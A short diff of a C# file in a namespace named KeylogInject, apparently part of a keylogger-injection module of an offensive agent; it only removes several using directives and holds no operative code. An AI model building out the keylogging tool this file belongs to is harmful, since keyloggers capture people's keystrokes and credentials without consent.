@@ -1,14 +1,8 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
-using System.IO;
 using System.Text;
-using System.Linq;
 using static KeylogInject.Native;
-using System.Threading;
-using ApolloInterop.Classes.Collections;
-using ApolloInterop.Structs.ApolloStructs;
 using static KeylogInject.Delegates;
 
 namespace KeylogInject
